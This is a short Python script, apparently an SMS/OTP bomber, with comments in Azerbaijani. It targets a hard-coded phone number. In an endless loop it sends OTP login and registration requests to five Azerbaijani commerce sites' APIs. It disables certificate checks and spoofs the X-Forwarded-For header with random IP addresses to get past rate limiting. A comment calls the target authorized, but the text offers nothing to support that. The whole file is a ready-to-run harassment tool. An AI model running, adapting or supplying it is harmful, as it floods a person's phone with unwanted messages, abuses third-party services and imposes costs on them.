import urllib.request
import json
import random
import time
import ssl

TARGET_PHONE = "994508880067" # Səlahiyyətli hədəf

def final_storm():
    print(f"[!!!] LOCAL-STORM START: {TARGET_PHONE}")
    
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    # Azərbaycanda aktiv və 2026-cı ildə işləyən dözümsüz API-lər
    API_LIST = [
        {"name": "Umico", "url": "https://api.umico.az/api/v1/login/otp", "data": {"user_identifier": TARGET_PHONE, "type": "login"}},
        {"name": "BakuElectronics", "url": "https://bakuelectronics.az/api/otp/send", "data": {"phone": TARGET_PHONE, "type": "registration"}},
        {"name": "Kontakt", "url": "https://kontakt.az/wp-json/contact-api/v1/send-otp", "data": {"number": TARGET_PHONE[-9:], "type": "login"}},
        {"name": "AliPasha", "url": "https://api.alipasha.az/api/v1/otp/send", "data": {"phone": TARGET_PHONE}},
        {"name": "Vois", "url": "https://api.vois.az/api/v1/otp/send", "data": {"phone": TARGET_PHONE}}
    ]

    while True:
        for api in API_LIST:
            try:
                headers = {
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15",
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                }
                
                req = urllib.request.Request(api["url"], data=json.dumps(api["data"]).encode(), headers=headers, method='POST')
                
                with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
                    code = resp.getcode()
                    print(f"[*] {api['name']} -> SUCCESS (Status: {code})")
                
                time.sleep(2) # Hər servisi ard-arda yormamaq üçün

            except Exception as e:
                # print(f"[MISS] {api['name']}")
                pass
        
        print("--- Bir dalğa bitdi, 3 saniyə fasilə ---")
        time.sleep(3)

if __name__ == "__main__":
    final_storm()
